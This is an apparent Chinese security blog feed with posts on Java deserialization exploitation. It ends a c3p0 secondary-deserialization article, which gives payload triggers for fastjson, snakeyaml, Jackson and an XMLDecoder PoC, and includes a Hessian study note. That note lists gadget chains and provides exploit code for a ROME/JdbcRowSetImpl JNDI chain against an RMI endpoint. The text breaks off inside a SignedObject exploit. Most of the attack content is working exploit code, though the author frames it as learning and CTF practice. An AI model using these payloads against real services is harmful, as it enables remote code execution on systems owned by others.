class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">c3p0_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br><span class="hljs-comment">//        String json =&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand1\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand2\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap?&quot;+exp+&quot;?\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;</span><br><span class="hljs-comment">//        JSON.parseObject(json);</span><br><br><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br><span class="hljs-comment">//        String payload = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot; +</span><br><span class="hljs-comment">//                &quot;userOverridesAsString: HexAsciiSerializedMap@&quot; + exp + &#x27;@&#x27;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">////        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">////        Yaml yaml = new Yaml(safeConstructor);</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(payload);</span><br><br><span class="hljs-comment">//        三、Jackson &lt; 2.8.10反序列化</span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ exp + &quot;;\&quot;&#125;]&#125;&quot;;</span><br><span class="hljs-comment">//        System.out.println(poc);</span><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        objectMapper.enableDefaultTyping();</span><br><span class="hljs-comment">//        objectMapper.readValue(poc, Person.class);</span><br><span class="hljs-comment">//        四、XML反序列化 天大的鸡肋，纯凑数</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">fileToHex</span><span class="hljs-params">(String filePath)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath)) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> bytesToHex(buffer, bytesRead);<br>                hexBuilder.append(hex);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexBuilder.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes, <span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length * <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            sb.append(Character.forDigit((bytes[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>, <span class="hljs-number">16</span>));<br>            sb.append(Character.forDigit((bytes[i] &amp; <span class="hljs-number">0xF</span>), <span class="hljs-number">16</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Xml-poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>HexAsciiSerializedMap:SEROBJHEX;<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>​怎么看c3p0的二次都很鸡肋。24年了，只能说ctf专项吧。</p><h2 id="抄作业链接"><a href="#抄作业链接" class="headerlink" title="抄作业链接"></a>抄作业链接</h2><p><a href="https://xz.aliyun.com/t/10728">https://xz.aliyun.com/t/10728</a></p><p><a href="https://tttang.com/archive/1701/#toc__7">https://tttang.com/archive/1701/#toc__7</a></p><p><a href="http://moonflower.fun/index.php/2022/04/18/316/">http://moonflower.fun/index.php/2022/04/18/316/</a></p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian学习</title>
    <link href="/2024/01/18/Hessian%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/18/Hessian%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Hessian是什么"><a href="#Hessian是什么" class="headerlink" title="Hessian是什么"></a>Hessian是什么</h2><p>Hessian是一个基于RPC的高性能二进制远程传输<strong>协议</strong>，官方对Java、Flash&#x2F;Flex、Python、C++、.NET C#等多种语言都进行了实现，并且Hessian一般通过Web Service提供服务。在Java中，Hessian的使用方法非常简单，它使用Java语言接口定义了远程对象，并通过序列化和反序列化将对象转为Hessian二进制格式进行传输。</p><h3 id="0x01-反序列化分析"><a href="#0x01-反序列化分析" class="headerlink" title="0x01 反序列化分析"></a>0x01 反序列化分析</h3><p>demo，直接搬的枫师傅的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>  &#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person(name=&quot;</span>+name+<span class="hljs-string">&quot;,age=&quot;</span>+age+<span class="hljs-string">&quot;)&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.setSerializerFactory(serializerFactory);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">996</span>);<br>        person.setName(<span class="hljs-string">&quot;Feng&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(person);<br>        System.out.println((Person)deserialize(s));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240122014944883.png" alt="image-20240122014944883"></p><p>可以序列化数据是以“mt”表示服。</p><p>与序列化过程设计类似，Hessian 定义了 Deserializer 接口，并为不同的类型创建了不同的实现类。这里重点看下对自定义类型对象的读取。</p><p>在 Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。</p><p>在 Hessian 2.0 中，则是提供了 UnsafeDeserializer 来对自定义类型数据进行反序列化，关键方法在 readObject 处。</p><p><img src="image-20240122005852898.png" alt="image-20240122005852898"></p><p>由于 Hessian 1.0 会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。</p><p>在HessianInput#readObject中会使用case语句选择。</p><p><img src="image-20240122010920029.png" alt="image-20240122010920029"></p><p>由于Hessian 2.0t会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为72）。</p><p>在Hessian2Input#readObject中会使用case语句选择。</p><p><img src="image-20240122011138483.png" alt="image-20240122011138483"></p><p><img src="image-20240122011102930.png" alt="image-20240122011102930"></p><p>最后都会待用SerializerFactory.class#readMap()</p><p><img src="image-20240122013120135.png" alt="image-20240122013120135"></p><p>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code></p><p>com&#x2F;caucho&#x2F;hessian&#x2F;io&#x2F;SerializerFactory.java#getDeserializer（）</p><p><img src="image-20240122013421743.png" alt="image-20240122013421743"></p><p>通过<code>getDeserializer()</code>来获取一个<code>deserializer</code>,没有就new一个，ram嗨皮创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><img src="image-20240122013648618.png" alt="image-20240122013648618"></p><p><img src="image-20240122013658581.png" alt="image-20240122013658581"></p><p> HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hasCode 方法。</p><p>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</p><ul><li><p>gadget chain 起始方法只能为 hashCode&#x2F;equals</p></li><li><p>利用链中调用的成员变量不能为 transient 修饰</p></li><li><p>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑</p><p>TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p><p>可以参考这个，<a href="https://www.cnblogs.com/LittleHann/p/17818994.html">https://www.cnblogs.com/LittleHann/p/17818994.html</a></p><p>MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p><p><img src="image-20240122015558230.png" alt="image-20240122015558230"></p><p>参考xstreem，有一下两条</p><p>通过TreeMap去触发compareTo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.sound.sampled.AudioFileFormat.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XStringForFSB.equal<br>        javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br></code></pre></td></tr></table></figure><h3 id="0x02-构造exp"><a href="#0x02-构造exp" class="headerlink" title="0x02 构造exp"></a>0x02 构造exp</h3><h4 id="一、想到就是hashmap-remo-jndi"><a href="#一、想到就是hashmap-remo-jndi" class="headerlink" title="一、想到就是hashmap-&gt;remo-&gt;jndi"></a>一、想到就是hashmap-&gt;remo-&gt;jndi</h4><p>TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p><p><strong>为什么使用Java原生反序列化时不会报错</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="%E5%9B%BE%E7%89%87-68.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiUIDefaults</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><span class="hljs-comment">//    static SerializerFactory serializerFactory = new SerializerFactory();</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        serializerFactory.setAllowNonSerializable(true);</span><br><br><br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;</span>);<br>        jdbcRowSet.setMatchColumn(<span class="hljs-string">&quot;1&quot;</span>);<br><br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(jdbcRowSet.getClass(),jdbcRowSet));<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">hessian_jndi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian_jndi&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(hessian_jndi);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">hessian_jndi1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;hessian_jndi&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(hessian_jndi1);<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="二、hessisan-SignedObject二次反序列化"><a href="#二、hessisan-SignedObject二次反序列化" class="headerlink" title="二、hessisan-&gt;SignedObject二次反序列化"></a>二、hessisan-&gt;SignedObject二次反序列化</h4><p>hashmap.hashcode()-&gt;remo.toString()-&gt;signedObject.getObject-&gt;BadAttributeValueExpException.readObject-&gt;remo.toString()-&gt;templateiml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 